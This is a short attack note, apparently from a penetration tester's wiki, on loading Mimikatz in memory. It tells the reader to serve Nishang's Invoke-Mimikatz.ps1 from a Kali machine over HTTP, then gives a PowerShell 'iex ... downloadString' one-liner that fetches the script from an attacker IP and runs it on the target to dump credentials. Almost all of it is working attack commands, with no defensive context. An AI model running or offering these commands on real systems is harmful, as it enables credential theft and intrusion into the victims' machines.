# Introduction

Mimikatz stuff

# Contents

[[_TOC_]]

# Mimikatz PowerShell In-memory attack

## Attack machine

1. On Kali find `.ps1` script here: `/usr/share/nishang/Gather/Invoke-Mimikatz.ps1`
1. Serve it from the Kali machine:

    ```bash
    cd /usr/share/nishang/Gather/
    python3 -m http.server 80
    ```

## Target machine

1. Download and execute in memory (from PowerShell) (__TODO: Get PS Version needed__):

    ```bat
    iex(New-Object net.WebClient).downloadString("http://<attacker_ip>/Invoke-Mimikatz.ps1")
    ```

1. The previous command will download and load the module in memory. You should now be able to run `Invoke-Mimikatz` on the PowerShell command line.
